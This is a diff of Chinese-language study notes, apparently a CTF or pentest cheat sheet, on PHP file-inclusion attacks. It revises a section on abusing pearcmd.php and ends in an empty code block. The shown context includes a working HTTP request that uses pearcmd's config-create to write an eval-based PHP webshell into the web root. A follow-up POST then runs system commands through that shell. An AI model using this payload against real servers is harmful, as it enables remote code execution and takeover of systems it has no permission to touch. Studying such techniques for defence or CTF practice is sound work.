@@ -112,13 +112,14 @@ zip://D:\\phpinfo.jpg%23phpinfo.txt
 
 ## **pearcmd.php文件包含**
 已知文件包含：include $_GET['c'].".php";
-裸文件包含, 没有上传点, 可供尝试的只有pearcmd.php上传木马。
-先用
+裸文件包含, 没有上传点, 可供尝试的只有包含pearcmd.php文件，直接写木马。
+包含pearcmd.php用?c=pearcmd
+同时写木马到目录下的test.php
 ```
 GET /index.php?+config-create+/&c=pearcmd&/<?=@eval($_POST['cmd']);?>+/var/www/html/test.php HTTP/1.1
 ```
+
 在/var/www/html下写入webshell
-再
 ```
 POST /test.php HTTP/1.1
 
@@ -129,6 +130,10 @@ cmd=system("cat 36d.php");
 ```
 也可<https://www.cnblogs.com/Egcrying/p/17665041.html>
 
+如果知道pearcmd.php路径
+```
+
+```
 
 
 
